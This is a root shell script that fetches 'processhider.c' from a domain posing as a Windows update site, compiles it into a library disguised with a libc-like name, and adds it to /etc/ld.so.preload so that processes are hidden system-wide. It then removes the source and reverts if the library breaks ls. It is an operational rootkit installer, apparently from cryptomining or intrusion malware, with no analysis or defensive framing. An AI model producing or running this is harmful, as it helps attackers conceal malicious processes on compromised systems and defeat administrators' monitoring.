if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
else
  if [ `grep libc2.28 /etc/ld.so.preload`  ]
  then echo "hideproc already done!!"
  else
    apt-get update -y
    apt-get install build-essential -y
    yum check-update
    yum install build-essential -y
    dnf groupinstall "Development Tools" -y
    yum group install "Development Tools"  -y
    curl http://m.windowsupdatesupport.org/d/processhider.c -o  processhider.c

    gcc -Wall -fPIC -shared -o libc2.28.so processhider.c -ldl
    mv libc2.28.so /usr/local/lib/ -f
    grep libc2.28 /etc/ld.so.preload  || echo /usr/local/lib/libc2.28.so >> /etc/ld.so.preload
    rm -f processhider.c
    ls >/tmp/.1  2>&1
    grep libc2.28.so /tmp/.1 && echo >/etc/ld.so.preload
  fi
fi